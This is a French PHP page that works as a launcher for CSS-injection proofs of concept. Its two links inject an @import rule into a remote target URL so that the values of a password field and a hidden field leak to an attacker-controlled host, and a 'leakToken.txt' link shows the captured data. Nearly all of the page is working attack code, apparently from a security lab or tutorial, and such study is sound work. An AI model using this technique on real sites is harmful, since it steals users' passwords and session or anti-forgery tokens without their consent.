<?php
    require_once('config.php');
?>

<!DOCTYPE html>
<html lang="fr">
    <head>
        <meta charset="utf-8">
        <title>Les injections CSS - Règle @import</title>
    </head>
    <body>
        <h1>Récupération de la valeur d'un attribut d'un élément HTML via utilisation de la règle @import</h1>

        <a href="leakToken.txt">Voir les données récupérées</a>

        <h2>PoC #1 - Champ de type password</h2>
        <?php
            echo '<a href="' . RHOST . RURL . '@import url(' . LHOST . LURL_START . '?name=' . HTML_INPUT_PASSWORD_NAME . ')" target="_blank">Démarrer l\'attaque</a>';
        ?>

        <h2>PoC #2 - Champ de type hidden</h2>
        <?php
            echo '<a href="' . RHOST . RURL . '@import url(' . LHOST . LURL_START . '?name=' . HTML_INPUT_HIDDEN_NAME . ')" target="_blank">Démarrer l\'attaque</a>';
        ?>
    </body>
</html>